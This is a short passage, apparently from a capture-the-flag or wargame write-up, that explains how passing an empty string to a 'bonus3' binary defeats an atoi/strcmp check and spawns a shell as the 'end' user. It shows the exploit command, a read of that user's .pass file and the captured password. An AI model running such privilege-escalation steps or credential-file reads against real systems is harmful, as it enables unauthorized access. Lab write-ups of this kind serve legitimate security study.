If we pass an empty string as an argument, `atoi` will return `0`, then it will set `buf[0] = 0`, compares the empty string with `buf` which, for `strcmp`, is equal to an empty string as it starts with 0, and exec the shell with permissions for the `end` user !
```shell
bash$ ./bonus3 ""
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
